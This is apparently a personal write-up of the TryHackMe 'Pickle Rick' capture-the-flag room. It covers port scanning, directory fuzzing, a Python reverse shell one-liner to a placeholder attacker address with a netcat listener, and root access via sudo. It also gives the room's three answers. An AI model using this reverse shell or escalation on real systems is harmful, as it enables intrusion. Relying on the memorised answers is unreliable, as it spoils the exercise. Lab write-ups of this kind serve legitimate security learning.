---
tags:
  - tryhackme
  - challenge
  - easy
  - offensive
  - linux
  - sudo-abuse
---

# Pickle Rick
![Pickle Rick logo](logos/pickle_rick_logo.png)

**Platform:** TryHackMe  
**Type:** Challenge  
**Difficulty:** Easy  
**Link:** [Pickle Rick](https://tryhackme.com/room/picklerick)  
**Video:** [YouTube Walkthrough](https://youtu.be/LAJm5sEn75w)

## Description
"A Rick and Morty CTF. Help turn Rick back into a human!

This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle."

## Enumeration
### `nmap` port scan
```
ports=$(nmap -p- --min-rate=1000 TARGET_IP_ADDRESS | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -A -T4 TARGET_IP_ADDRESS
```
### Web discovery
`http://TARGET_IP_ADDRESS/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c`
`gobuster dir -u TARGET_IP_ADDRESS -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,tx`

## Foothold
[Payloads All the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
### Python reverse shell
**In web application:**  
`python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP_ADDRESS",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'`  
**On attacking machine:**  
`nc -lvnp 4444`
### First ingredient discovery
```
pwd
ls -al
cat Sup3rS3cretPickl3Ingred.txt
```
??? success "What is the first ingredient that Rick needs?"
	mr. meeseek hair
### Second ingredient discovery
```
ls -al /home
ls -al /home/rick
cat "/home/rick/second ingredients"
```
??? success "What is the second ingredient in Rick’s potion?"
	1 jerry tear

## Privilege Escalation
```
sudo bash -i
cd /root
ls -al
cat 3rd.txt
```
??? success "What is the last and final ingredient?"
	fleeb juice

**Tools Used**  
`gobuster` `python`

**Date completed:** 10/04/26  
**Date published:** 10/04/26